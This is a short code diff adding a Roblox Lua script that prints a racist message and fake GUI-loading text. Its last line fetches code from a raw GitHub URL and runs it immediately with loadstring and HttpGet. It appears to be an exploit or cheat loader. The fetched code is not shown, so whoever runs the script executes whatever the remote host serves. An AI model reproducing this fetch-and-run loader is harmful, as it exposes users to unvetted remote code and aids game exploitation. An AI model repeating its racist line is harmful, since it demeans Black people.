@@ -1,0 +1,7 @@
+wait(1)
+print("Zu0a hates black people...")
+wait()
+print("Loading Gui...")
+wait()
+print("GUI Loaded")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zu0aX/NORTHWIND/main/1"))()
